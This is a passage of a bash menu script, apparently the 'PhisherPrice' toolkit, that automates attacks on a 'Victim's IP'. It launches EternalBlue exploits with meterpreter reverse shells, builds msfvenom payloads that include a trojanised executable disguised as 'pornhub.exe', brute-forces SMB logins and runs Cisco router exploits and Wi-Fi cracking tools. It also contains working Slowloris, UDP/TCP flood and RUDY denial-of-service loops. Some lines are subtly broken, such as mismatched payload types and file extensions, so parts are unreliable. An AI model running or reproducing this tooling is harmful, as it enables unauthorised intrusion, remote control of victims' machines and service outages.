msfconsole -q -x " use auxiliary/scanner/smb/smb_ms17_010; set rhosts $r ; exploit ;exit ;"
echo ' '
echo '           Press ENTER to Main Menu '
echo ' '
read

elif [ "$x" == "$scub2" ]; then                    #scub-Option-2
clear
echo "Victim's IP:"
read r

msfconsole -q -x " use auxiliary/scanner/smb/pipe_auditor; set rhosts $r ; exploit ;exit ;"
echo ' '
echo '           Press ENTER to Main Menu '
echo ' '
read

elif [ "$x" == "$scub3" ]; then                    #scub-Option-3
clear
echo "Victim's IP:"
read r

msfconsole -q -x " use auxiliary/scanner/smb/pipe_dcerpc_auditor; set rhosts $r ; exploit ;exit ;"
echo ' '
echo '           Press ENTER to Main Menu '
echo ' '
read

elif [ "$x" == "$scub4" ]; then                    #scub-Option-4
clear
echo "Victim's IP:"
read r

msfconsole -q -x " use auxiliary/scanner/smb/smb2; set rhosts $r ; exploit ;exit ;"
echo ' '
echo '           Press ENTER to Main Menu '
echo ' '
read

elif [ "$x" == "$scub5" ]; then                    #scub-Option-5
clear
echo "Victim's IP:"
read r

msfconsole -q -x " use auxiliary/scanner/smb/smb_enumusers; set rhosts $r ; exploit ;exit ;"
echo ' '
echo '           Press ENTER to Main Menu '
echo ' '
read
elif [ "$x" == "$scub6" ]; then                    #scub-Option-6
clear
echo "Victim's IP:"
read r
echo "Victim's Password:"
read passmb
echo "Victim's User Account:"
read accsmb

msfconsole -q -x " use auxiliary/scanner/smb/smb_login; set rhosts $r ; set SMBPass $passmb ; set SMBUser $accsmb ; exploit ;exit ;"
echo ' '
echo '           Press ENTER to Main Menu '
echo ' '
read
elif [ "$x" == "$scub7" ]; then                    #scub-Option-7
clear
echo "Victim's IP:"
read r

msfconsole -q -x " use auxiliary/scanner/smb/smb_lookupsid; set rhosts $r ; exploit ;exit ;"
echo ' '
echo '           Press ENTER to Main Menu '
echo ' '
read

elif [ "$x" == "$scub8" ]; then                    #scub-Option-8
clear
echo "Victim's IP:"
read r

msfconsole -q -x " use auxiliary/scanner/smb/smb_version; set rhosts $r ; exploit ;exit ;"
echo ' '
echo '           Press ENTER to Main Menu '
echo ' '
read

else 

n


fi



elif [ "$x" == "$auto2" ]; then                    #auto-Option-2
echo "Victim's IP:"
read r

msfconsole -q -x " use exploit/windows/smb/ms17_010_eternalblue; set payload windows/x64/meterpreter/reverse_tcp;  set lhost $ip ; set rhost $r ; exploit ; "




elif [ "$x" == "$auto3" ]; then                    #auto-Option-3
echo "Victim's IP:"
read r

msfconsole -q -x " use exploit/windows/smb/ms17_010_eternalblue; set payload windows/x64/vncinject/reverse_tcp;  set lhost $ip ; set rhost $r ; set viewonly false ; exploit ; "

elif [ "$x" == "$auto4" ]; then                    #auto-Option-4
echo "Victim's IP:"
read r

msfconsole -q -x " use exploit/windows/smb/ms17_010_psexec; set payload windows/vncinject/reverse_tcp;  set lhost $ip ; set rhost $r ; set viewonly false ; exploit ; "

elif [ "$x" == "$auto5" ]; then                    #auto-Option-5
echo "Victim's IP:" 
read r

msfconsole -q -x " use exploit/windows/smb/ms17_010_psexec; set lhost $ip ; set rhost $r ; exploit ;"


elif [ "$x" == "$auto6" ]; then                    #auto-Option-6
echo 'Uripath: (/)'
read u
msfconsole -q -x " use exploit/windows/misc/hta_server; set srvhost $ip; set uripath /$u; set payload windows/meterpreter/reverse_tcp; set lhost $ip ; exploit ;"

elif [ "$x" == "$auto7" ]; then                    #auto-Option-7
msfvenom -p windows/meterpreter/reverse_tcp lhost=$ip lport=4444 -f exe > /root/Desktop/pwnd.exe
echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!Your payload: /root/Desktop/pwnd.exe!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
Waiting for listener...
 
'

msfconsole -q -x " use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp;  set lhost $ip ; set lport 4444 ; exploit ;"

elif [ "$x" == "$auto8" ]; then                    #auto-Option-8

msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=4444 -e x86/shikata_ga_nai -b ‘\x00’ -i 3 -f exe > /root/Desktop/pwnd.exe
echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!Your payload: /root/Desktop/pwnd.exe!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
Waiting for listener...
 
'

msfconsole -q -x " use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp;  set lhost $ip ; set lport 4444 ; exploit ;"

elif [ "$x" == "$auto9" ]; then                    #auto-Option-9

msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=4444 -f asp > /root/Desktop/pwnd.asp
echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!Your payload: /root/Desktop/pwnd.asp!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
Waiting for listener...
 
'

msfconsole -q -x " use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp;  set lhost $ip ; set lport 4444 ; exploit ;"

elif [ "$x" == "$auto10" ]; then                    #auto-Option-10

msfvenom -p python/meterpreter/reverse_tcp lhost=$ip lport=4444 > /root/Desktop/pwnd.py
echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!Your payload: /root/Desktop/pwnd.py!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
Waiting for listener...
 
'

msfconsole -q -x " use exploit/multi/handler; set payload python/meterpreter/reverse_tcp;  set lhost $ip ; set lport 4444 ; exploit ;"

elif [ "$x" == "$auto11" ]; then                    #auto-Option-11
msfvenom -p java/meterpreter/reverse_tcp lhost=$ip lport=4444 -f jar > /root/Desktop/pwnd.jar
echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!Your payload: /root/Desktop/pwnd.jar!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
Waiting for listener...
 
'

msfconsole -q -x " use exploit/multi/handler; set payload java/meterpreter/reverse_tcp;  set lhost $ip ; set lport 4444 ; exploit ;"

elif [ "$x" == "$auto12" ]; then                    #auto-Option-12
msfvenom -p osx/x86/shell_bind_tcp RHOST=$ip LPORT=4444 -f macho > bind.macho
echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!Your payload: /root/Desktop/bind.macho!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
Waiting for listener...
 
'

msfconsole -q -x " use exploit/multi/handler; set payload android/meterpreter/reverse_tcp;  set lhost $ip ; set lport 4444 ; exploit ;"

elif [ "$x" == "$auto13" ]; then                    #auto-Option-13
msfvenom -p java/meterpreter/reverse_tcp lhost=$ip lport=4444 -f raw > /root/Desktop/pwnd.jsp
echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!Your payload: /root/Desktop/pwnd.jsp!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
Waiting for listener...
 
'

msfconsole -q -x " use exploit/multi/handler; set payload java/meterpreter/reverse_tcp;  set lhost $ip ; set lport 4444 ; exploit ;"

elif [ "$x" == "$auto14" ]; then                    #auto-Option-14
msfvenom -p php/meterpreter/reverse_tcp lhost=$ip lport=4444 > /root/Desktop/pwnd.php
echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!Your payload: /root/Desktop/pwnd.php!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
Waiting for listener...
 
'

msfconsole -q -x " use exploit/multi/handler; set payload php/meterpreter/reverse_tcp;  set lhost $ip ; set lport 4444 ; exploit ;"

elif [ "$x" == "$auto15" ]; then                    #auto-Option-15

msfvenom -p osx/x86/shell_bind_tcp RHOST=$ip LPORT=4444 -f macho > bind.macho
echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!Your payload: /root/Desktop/bind.macho!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
Waiting for listener...
 
'

msfconsole -q -x " use exploit/multi/handler; set payload android/meterpreter/reverse_tcp;  set lhost $ip ; set lport 4444 ; exploit ;"

elif [ "$x" == "$auto16" ]; then                    #auto-Option-16
echo "your .exe location:"
read exelocation
msfvenom -x $exelocation -k -p windows/meterpreter/reverse_tcp lhost=$ip lport=4444 > /root/Desktop/pornhub.exe
echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!Your payload: /root/Desktop/pornhub.exe!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
Waiting for listener...
 
'

msfconsole -q -x " use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp;  set lhost $ip ; set lport 4444 ; exploit ;"

elif [ "$x" == "$auto17" ]; then                    #auto-Option-17
echo "your .exe location:"
read bindexelocation
msfvenom -x $bindexelocation -k -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=4444 -e x86/shikata_ga_nai -i 3 -b “\x00” -f exe > example.exe
echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!Your payload: /root/Desktop/pornhub.exe!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
Waiting for listener...
 
'

msfconsole -q -x " use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp;  set lhost $ip ; set lport 4444 ; exploit ;"

elif [ "$x" == "$auto18" ]; then                    #auto-Option-18
msfvenom -p osx/x86/meterpreter/reverse_tcp lhost=$ip lport=4444 > /root/Desktop/pwnd.apk
echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!Your payload: /root/Desktop/pwnd.apk!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
Waiting for listener...
 
'

msfconsole -q -x " use exploit/multi/handler; set payload android/meterpreter/reverse_tcp;  set lhost $ip ; set lport 4444 ; exploit ;"


else 

n


fi

elif [ "$x" == "$option4" ]; then                          #Option4
clear
	echo -e "${banner}"
	echo -e '\e[3;34m Created by \e[1;31m"SirCryptic"                      
                   
\e[0m\e[3;39m \e[1;31m
WI-FI xSploits
\e[3;39m
(1) Stealth ARP Scan
(2) Passive ARP Scan
(3) Cisco Routers
(4) MasScan (Find Open Ports/Ips)
(5) Start Wifite
(6) Start Yersinia
(7) Bully
(8) Start Fern (Wifi Cracker)
(9) Start Eassid-ng (Buddy-ng)
(10) Start Kismet
(11) Wi-Fi HoneyPot
CTRL + C To Exit
Press ENTER To Go To Main Menu
'
suba='1'
subb='2'
subc='3'
subd='4'
sube='5'
yersin='6'
bully='7'
blueranger='8'
eeng='9'
kissmet1='10'
whoney='11'
subdosm='12'

wait
echo -e $Blue" ┌─["$red"PhisherPrice$Blue]──[$red~$Blue]─["$yellow"Networking$Blue]:"
echo -e $Blue" └─────► " ;read -p " CHOOSE: " x

if [ "$x" == "$suba" ]; then                    #Sub-Option-a
clear
echo -e '\e[1;33m
  _________ __                .__   __  .__         _____                
 /   _____//  |_  ____ _____  |  |_/  |_|  |__     /  _  \_____________  
 \_____  \\   __\/ __ \\__  \ |  |\   __\  |  \   /  /_\  \_  __ \____ \ 
 /        \|  | \  ___/ / __ \|  |_|  | |   Y  \ /    |    \  | \/  |_> >
/_______  /|__|  \___  >____  /____/__| |___|  / \____|__  /__|  |   __/ 
        \/           \/     \/               \/          \/      |__|    \e[1;34m
'
echo -e "\nNetwork Scanning with arp-scan"
echo -e "-------------------------------------------\n"

echo "Example IP Usage: 192.168.9.99"
echo "Enter the IP address to scan: " 
read subopa

echo -e "\nStarting network scan...\n"

if arp-scan -l -s $subopa -v; then
    echo -e "\nNetwork scan complete.\n"
else
    echo -e "\nNetwork scan failed.\n"
fi

read -p "Press Enter to continue."

elif [ "$x" == "$subb" ]; then                    #Sub-Option-b
clear
echo -e '\e[1;33m
   _____ ____________________    _________      .__  _____  _____             
  /  _  \\______   \______   \  /   _____/ ____ |__|/ ____\/ ____\___________ 
 /  /_\  \|       _/|     ___/  \_____  \ /    \|  \   __\\   __\/ __ \_  __ \
/    |    \    |   \|    |      /        \   |  \  ||  |   |  | \  ___/|  | \/
\____|__  /____|_  /|____|     /_______  /___|  /__||__|   |__|  \___  >__|   
        \/       \/                    \/     \/                     \/       \e[1;34m
'
echo -e "\nHost Information Gathering with netdiscover"
echo -e "-------------------------------------------\n"

echo -e "Starting information gathering...\n"

clear
if netdiscover -p; then
  echo -e "\nInformation gathering complete.\n"
else
  echo -e "\nInformation gathering failed.\n"
fi

read -p "Press Enter to continue."

elif [ "$x" == "$subc" ]; then                    #Sub-Option-c
clear
	echo -e "${banner}"
	echo -e '\e[3;34m Created by \e[1;31m"SirCryptic"                      
                   
\e[0m\e[3;39m \e[1;31m
Cisco Wifi Routers
\e[3;39m
(1) Cisco GE xPloit
(2) Cisco Audit Tool
CTRL + C To Exit
Press ENTER To Go To Main Menu
'
cisco1='1'
cisco2='2'


wait
echo -e $Blue" ┌─["$red"PhisherPrice$Blue]──[$red~$Blue]─["$yellow"Networking$Blue]:"
echo -e $Blue" └─────► " ;read -p " CHOOSE: " x

if [ "$x" == "$cisco1" ]; then                    #cisco-Option-1
clear
echo -e '\e[1;33m
_________   ________  ___________              .__         .__  __   
\_   ___ \ /  _____/  \_   _____/__  _________ |  |   ____ |__|/  |_ 
/    \  \//   \  ___   |    __)_\  \/  /\____ \|  |  /  _ \|  \   __\
\     \___\    \_\  \  |        \>    < |  |_> >  |_(  <_> )  ||  |  
 \______  /\______  / /_______  /__/\_ \|   __/|____/\____/|__||__|  
        \/        \/          \/      \/|__|                         \e[1;34m
'  
function validate_input {
    if ! [[ "$1" =~ ^[1-9][0-9]*$ && "$1" -le 14 ]]; then
        echo "Invalid option selected. Please select a number between 1 and 14."
        exit 1
    fi
}
echo "Enter target IP address:"
read target_ip
cat <<EOF
[1] - Cisco 677/678 Telnet Buffer Overflow Vulnerability
[2] - Cisco IOS Router Denial of Service Vulnerability
[3] - Cisco IOS HTTP Auth Vulnerability
[4] - Cisco IOS HTTP Configuration Arbitrary Administrative Access Vulnerability
[5] - Cisco Catalyst SSH Protocol Mismatch Denial of Service Vulnerability
[6] - Cisco 675 Web Administration Denial of Service Vulnerability
[7] - Cisco Catalyst 3500 XL Remote Arbitrary Command Vulnerability
[8] - Cisco IOS Software HTTP Request Denial of Service Vulnerability
[9] - Cisco 514 UDP Flood Denial of Service Vulnerability
[10] - CiscoSecure ACS for Windows NT Server Denial of Service Vulnerability
[11] - Cisco Catalyst Memory Leak Vulnerability
[12] - Cisco CatOS CiscoView HTTP Server Buffer Overflow Vulnerability
[13] - 0 Encoding IDS Bypass Vulnerability (UTF)
[14] - Cisco IOS HTTP Denial of Service Vulnerability
EOF

echo "Please select a vulnerability to exploit (1-14):"
read vulnerability
validate_input $vulnerability

echo "Do you have a password list? (y/n)"
read -r has_password_list
if [[ $has_password_list == "y" ]]; then
    echo "Please enter the location of your password list:"
    read password_list
    password_option="-a $password_list"
fi

echo "Do you have a user's list for name guessing? (y/n)"
read -r has_user_list
if [[ $has_user_list == "y" ]]; then
    echo "Please enter the location of your user list:"
    read user_list
    user_option="-w $user_list"
fi

echo "Do you want to check for IOS history bug? (y/n)"
read -r has_ios_history_bug
if [[ $has_ios_history_bug == "y" ]]; then
    ios_option="-i"
fi
clear
echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!!     Trying To PWN Router :D      !!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
'
cge.pl "$target_ip" "$vulnerability" "$ios_option" "$password_option" "$user_option"

read

elif [ "$x" == "$cisco2" ]; then                    #cisco-Option-2
clear
check_ios_history() {
    if [ "$ioscheck" == "-i" ]; then
        echo "Checking for IOS history bug..."
    fi
}

guess_usernames() {
    if [ "$userlist" != "" ]; then
        echo "Guessing usernames..."
    fi
}

echo -e '\e[1;33m
_________     ________________
\_   ___ \   /  _  \__    ___/
/    \  \/  /  /_\  \|    |   
\     \____/    |    \    |   
 \______  /\____|__  /____|   
        \/         \/         \e[1;34m
'  
echo "Cisco Auditing Tool"

echo "Enter the target IP address (e.g. 192.168.1.202): "
read target_ip

echo "Type the port you want to test (default is 23): "
read port_number
if [[ -z "$port_number" ]]; then
    port_number=23
fi

echo "Do you have a password list? (y/n): "
read password_list_option
if [[ "$password_list_option" == "y" ]]; then
    echo "Enter the location of your password list: "
    read password_list_location
    if [[ ! -f "$password_list_location" ]]; then
        echo "Password list file not found. Exiting..."
        exit 1
    fi
    password_list="-a $password_list_location"
fi

echo "Do you have a username list for guessing? (y/n): "
read username_list_option
if [[ "$username_list_option" == "y" ]]; then
    echo "Enter the location of your username list: "
    read username_list_location
    if [[ ! -f "$username_list_location" ]]; then
        echo "Username list file not found. Exiting..."
        exit 1
    fi
    userlist="-w $username_list_location"
fi

echo "Do you want to check for IOS history bug? (y/n): "
read ios_history_option
if [[ "$ios_history_option" == "y" ]]; then
    ioscheck="-i"
fi

echo -e "
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!!!       Auditing the host        !!!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
"

CAT -h "$target_ip" -p "$port_number" "$password_list" "$ioscheck" "$userlist"

guess_usernames
check_ios_history

read

else 

n


fi

elif [ "$x" == "$subd" ]; then                    #Sub-Option-d
clear
echo -e '\e[1;33m
   _____                  _________                     
  /     \ _____    ______/   _____/ ____ _____    ____  
 /  \ /  \\__  \  /  ___/\_____  \_/ ___\\__  \  /    \ 
/    Y    \/ __ \_\___ \ /        \  \___ / __ \|   |  \
\____|__  (____  /____  >_______  /\___  >____  /___|  /
        \/     \/     \/        \/     \/     \/     \/ \e[1;34m
'  
echo -e "\nNetwork Port Scanner with Masscan"
echo -e "---------------------------------\n"
echo "Enter IP (e.g. 192.168.1.0):"
read massip
echo "Enter Port Range (e.g. 24 or 80):"
read massrange

clear

echo -e "Starting port scan...\n"

if masscan -p22,21,80,445,443 $massip/$massrange; then
  echo -e "\nPort scan complete.\n"
else
  clear
  echo -e "\nPort scan failed.\n"
fi

read -p "Press Enter to continue."

elif [ "$x" == "$sube" ]; then                    #Sub-Option-e
clear
echo -e "\n**************************************************"
echo "******     Wifite Launcher     ******"
echo -e "**************************************************\n"

read -p "Are you sure you want to start Wifite? (y/n): " wifiwanger

if [[ $wifiwanger =~ ^[Yy]$ ]]; then
  clear
  echo -e "\n**************************************************"
  echo "******     Starting Wifite     ******"
  echo -e "**************************************************\n"
  
  wifite --kill-all
else
  clear
  echo -e "\n**************************************************"
  echo "******     Operation cancelled     ******"
  echo -e "**************************************************\n"
fi

read -p "Press Enter to continue."

elif [ "$x" == "$yersin" ]; then                    #Sub-Option-e
clear
echo -e "\n**************************************************"
echo "******     Yersinia Launcher     ******"
echo -e "**************************************************\n"

read -p "Are you sure you want to start Yersinia? (y/n): " siryessir

if [[ $siryessir =~ ^[Yy]$ ]]; then
  clear
  echo -e "\n**************************************************"
  echo "******     Starting Yersinia     ******"
  echo -e "**************************************************\n"

  yersinia -G
else
  clear
  echo -e "\n**************************************************"
  echo "******     Operation cancelled     ******"
  echo -e "**************************************************\n"
fi

read -p "Press Enter to continue."

elif [ "$x" == "$bully" ]; then                    #YouLilBully
clear
echo -e "\n**************************************************"
echo "******     Wi-Fi Bully     ******"
echo -e "**************************************************\n"

read -p "Enter the ESSID of the network you want to bully (e.g. 6F36E6): " essid
if [[ ! $essid =~ ^[a-fA-F0-9]{6}$ ]]; then
  echo -e "\nInvalid ESSID. Please enter a valid 6-character hexadecimal string."
  read -p "Press Enter to continue."
fi

read -p "Which Wi-Fi interface are you using? (wlan0mon/wlan1mon): " interface
if [[ ! $interface =~ ^(wlan0mon|wlan1mon)$ ]]; then
  echo -e "\nInvalid interface name. Please enter either wlan0mon or wlan1mon."
  read -p "Press Enter to continue."
fi

read -p "Are you sure you want to bully network with ESSID $essid using interface $interface? (y/n): " confirm
if [[ ! $confirm =~ ^[Yy]$ ]]; then
  echo -e "\nOperation cancelled."
  read -p "Press Enter to continue."
fi

clear
echo -e "\n**************************************************"
echo "******     Starting Bully     ******"
echo -e "**************************************************\n"
bully -e $essid $interface

if [[ $? -ne 0 ]]; then
  clear
  echo -e "\nBully failed. Please make sure you have the necessary tools installed and try again."
  read -p "Press Enter to continue."
fi

echo -e "\n**************************************************"
echo "******     Bullying complete     ******"
echo -e "**************************************************\n"

read -p "Press Enter to continue."

elif [ "$x" == "$blueranger" ]; then                          #BlueRanger
clear
echo -e "\n**************************************************"
echo "******     Fern Wifi-Cracker Launcher     ******"
echo -e "**************************************************\n"

read -p "Are you sure you want to start Fern Wifi-Cracker? (y/n): " start_fern

if [[ $start_fern =~ ^[Yy]$ ]]; then
  clear
  echo -e "\n**************************************************"
  echo "******     Starting Fern Wifi-Cracker     ******"
  echo -e "**************************************************\n"

  fern-wifi-cracker
else
  clear
  echo -e "\n**************************************************"
  echo "******     Operation cancelled     ******"
  echo -e "**************************************************\n"
fi

read -p "Press Enter to continue."

elif [ "$x" == "$eeng" ]; then                          #BlueRanger
clear
echo -e "\n**************************************************"
echo "******     Easside-NG Launcher     ******"
echo -e "**************************************************\n"

read -p "Are you sure you want to start Easside-NG? (y/n): " easside_choice

if [[ $easside_choice =~ ^[Yy]$ ]]; then
  echo "Enter victim's BSSID (e.g. de:ad:be:ef:ca:fe): "
  read vbssid
  
  echo "Enter source MAC address: "
  read srcmac
  
  echo "Enter Buddy-ng IP address (mandatory), usually 127.0.0.1: "
  read srcip
  
  echo "Enter your interface (e.g. wlan0mon or wlan1mon): "
  read easymc
  
  echo "Enter the channel ID (e.g. 6): "
  read easychan
  
  clear
  
  echo -e "\n**************************************************"
  echo "******     Starting Fern Easside-NG     ******"
  echo -e "**************************************************\n"
  
  xterm -e "buddy-ng" &
  sleep 1
  
  easside-ng -v $vbssid -m $srcmac -s $srcip -f $easymc -c $easychan
  
else
  
  echo -e "\n**************************************************"
  echo "******     Operation cancelled     ******"
  echo -e "**************************************************\n"
fi

read -p "Press Enter to continue."

elif [ "$x" == "$kissmet1" ]; then                          #kissmet
clear
echo -e "\n**************************************************"
echo "******        Kismet Launcher        ******"
echo -e "**************************************************\n"

read -p "Are you sure you want to start Kismet? (y/n): " kissmebaby

if [[ $kissmebaby =~ ^[Yy]$ ]]; then
  clear
  echo -e "\n**************************************************"
  echo "******        Starting Kismet        ******"
  echo "******  To Stop Kismet CTRL + C     ******"
  echo -e "**************************************************\n"
  
  kismet
else
  clear
  echo -e "\n**************************************************"
  echo "******     Operation cancelled     ******"
  echo -e "**************************************************\n"
fi

read -p "Press Enter to continue."

elif [ "$x" == "$whoney" ]; then                          #routersploit
clear
echo "Are you sure you want to start HoneyPot?"
read hpot

if [[ $hpot =~ ^[Yy]$ ]]; then
  echo "Enter a wifi name of your choice: " 
  read wifiname
  echo "Enter wifi channel you wish to broadcast on (e.g. 6 or 11): " 
  read wifichannel
  echo "Enter your Interface (e.g. wlan0 or wlan1): " 
  read hpotif

  clear
  echo -e "\n**************************************************"
  echo "******        Starting HoneyPot...      ******"
  echo -e "**************************************************\n"

  airmon-ng check kill
  wifi-honey $wifiname $wifichannel $hpotif

  read -p "Press Enter to disable monitor mode and continue." confirm

  if [[ $confirm =~ ^[Yy]$ ]]; then
    sudo service network-manager restart
  else
    echo -e "\n**************************************************"
    echo "******  Monitor mode has not been disabled. ******"
    echo -e "**************************************************\n"
  fi

  read -p "Press Enter to continue."
else
  clear
  echo -e "\n**************************************************"
  echo "******        Operation cancelled        ******"
  echo -e "**************************************************\n"
fi

read -p "Press Enter to continue."
else 

n


fi

elif [ "$x" == "$subdosm" ]; then                          #DOS
clear
	echo -e "${banner}"
	echo -e '\e[3;34m Created by \e[1;31m"SirCryptic"                      
                   
\e[0m\e[3;39m \e[1;31m
Denial-Of-Service Toolkit
\e[3;39m
(1) Check If Vuln To DoS
(2) Slowloris Attack
(3) UDP/TCP Flood Attack
(4) R-U-Dead-Yet Attack
(5) SYN flood attack
CTRL + C To Exit
Press ENTER To Go To Main Menu
'
vuln2dos='1'
slowdos='2'
udpdos='3'
rudydos='4'
synner='5'

wait
echo -e $Blue" ┌─["$red"PhisherPrice$Blue]──[$red~$Blue]─["$yellow"DoS-Toolkit$Blue]:"
echo -e $Blue" └─────► " ;read -p " CHOOSE: " x
if [ "$x" == "$vuln2dos" ]; then                    #slowloris
clear
# Prompt user for hostname or IP address
echo "Enter a hostname or IP address to check for vulnerabilities:"
read target

# Check for Slowloris attack
echo "Checking for Slowloris attack..."
if curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0" --connect-timeout 10 -m 60 -k -s -o /dev/null -w "%{http_code}" -H "Connection: close" -H "Accept-language: en-US,en,q=0.5" "${target}" | grep -q "4[0-9][0-9]\|5[0-9][0-9]"; then
    echo "Slowloris attack detected!"
else
    echo "Slowloris attack not detected."
fi

# Check for UDP/TCP Flood attack
echo "Checking for UDP/TCP Flood attack..."
if hping3 -c 10000 -d 120 -S -w 64 -p 80 --flood "${target}" 2>&1 | grep -q "10000 packets transmitted, [0-9]* packets received, -100% packet loss"; then
    echo "UDP/TCP Flood attack detected!"
else
    echo "UDP/TCP Flood attack not detected."
fi

# Check for R-U-Dead-Yet attack
echo "Checking for R-U-Dead-Yet attack..."
if curl -H "Accept-Encoding: gzip, deflate" -H "Accept-Language: en-US,en;q=0.5" -H "User-Agent: () { :; }; /bin/bash -c 'echo Vulnerable!'" -H "Connection: keep-alive" --connect-timeout 10 -m 60 -k -s -o /dev/null -w "%{http_code}" "${target}" | grep -q "5[0-9][0-9]"; then
    echo "R-U-Dead-Yet attack detected!"
else
    echo "R-U-Dead-Yet attack not detected."
fi

# Check for SYN Flood attack
echo "Checking for SYN Flood attack..."
if hping3 -c 10000 -d 120 -S -w 64 --flood "${target}" 2>&1 | grep -q "10000 packets transmitted, [0-9]* packets received, -100% packet loss"; then
    echo "SYN Flood attack detected!"
else
    echo "SYN Flood attack not detected."
fi
read
elif [ "$x" == "$slowdos" ]; then                    #slowloris
    clear
    echo "Slowloris Type Attack"
    read -p "Enter the hostname or IP address of the target: " host
    read -p "Enter the port number of the target: " port
    read -p "Enter the number of requests to send: " requests
    read -p "Enter the time to last (in seconds): " duration
    read -p "Enter the delay between requests (in seconds): " delay
    read -p "Use HTTPS? [y/n]: " use_https

    if [[ $use_https == "y" ]]; then
      protocol="https"
    else
      protocol="http"
    fi

    read -p "Randomize User-Agent header? [y/n]: " randomize_ua

    if [[ $randomize_ua == "y" ]]; then
      ua_flag="-H 'User-Agent: \$(shuf -n 1 user_agents.txt)'"
    else
      ua_flag=""
    fi

    endtime=$((SECONDS+duration))

    echo "Starting Slowloris attack on $host:$port for $duration seconds with $requests requests and $delay second delay between requests."

    while [ $SECONDS -lt $endtime ]; do
      for ((i=0;i<$requests;i++)); do
        if [[ $randomize_ua == "y" ]]; then
          eval "curl -s -o /dev/null -k -m 10 --retry 0 $ua_flag ${protocol}://$host:$port/ >/dev/null 2>&1 &"
        else
          curl -s -o /dev/null -k -m 10 --retry 0 ${protocol}://$host:$port/ >/dev/null 2>&1 &
        fi
        sleep $delay
      done
      echo -ne "Slowloris attack in progress...\r"
      sleep 0.5
      echo -ne "                                                   \r"
      sleep 0.5
    done

    echo "Slowloris attack on $host:$port finished."

fi

read

elif [ "$x" == "$udpdos" ]; then                    #udp-flood

clear
echo "UDP/TCP Flood Attack with Multithreading and Randomization"
echo "Example: 10.0.0.1 80 1024 60 50"
read -p "IP" ip

read -p "Port" port

read -p "Size of the packet to send" size

read -p "Time in seconds" t

read -p "Number of threads to use" threads

read -p "Do you want to randomize packet content? (y/n)" randomize_content

read -p "Do you want to randomize delay between requests? (y/n)" randomize_delay

read "Which protocol do you want to use? (UDP/TCP)" protocol

endtime=$((SECONDS+t))

echo "~To cancel the attack press 'Ctrl-C'"
echo "|IP|            |Port|            |Size|            |Time|            |Threads|            |Randomize Content|            |Randomize Delay|            |Protocol|"
echo "|$ip|            |$port|            |$size|            |$t|            |$threads|            |$randomize_content|            |$randomize_delay|            |$protocol|"

function attack {
  if [ "$randomize_content" == "y" ]; then
    data=$(head -c $size /dev/urandom | tr -dc 'a-zA-Z0-9')
  else
    data=$(printf "%${size}s" | tr ' ' 'A')
  fi

  if [ "$protocol" == "UDP" ]; then
    echo "$data" > /dev/udp/$ip/$port
  else
    echo "$data" | nc -w 1 $ip $port
  fi
}

for ((i=0;i<$threads;i++)); do
  while [ $SECONDS -lt $endtime ]; do
    attack &
    if [ "$randomize_delay" == "y" ]; then
      sleep 0.$((RANDOM%3))
    else
      sleep 0.1
    fi
  done
done

echo "Attack finished."

read

elif [ "$x" == "$rudydos" ]; then                    #rudy
clear
echo "R-U-Dead-Yet (RUDY) Type Attack"
echo "Example: example.com 80 1000 60"
echo "Host"
read host

echo "Port"
read port

echo "Size of the payload in bytes"
read payload_size

echo "Number of headers"
read header_count

echo "Number of packets to send"
read packet_count

echo "Duration in seconds"
read duration

endtime=$((SECONDS+duration))

echo "~To cancel the attack press 'Ctrl-C'"
echo "|Hostname|            |Port|            |Payload Size|            |Header Count|            |Packet Count|            |Duration|"
echo "|$host|            |$port|            |$payload_size|            |$header_count|            |$packet_count|            |$duration|"

for ((i=0; i<packet_count; i++)); do
  headers=""
  for ((j=1; j<=header_count; j++)); do
    header_name=$(head /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
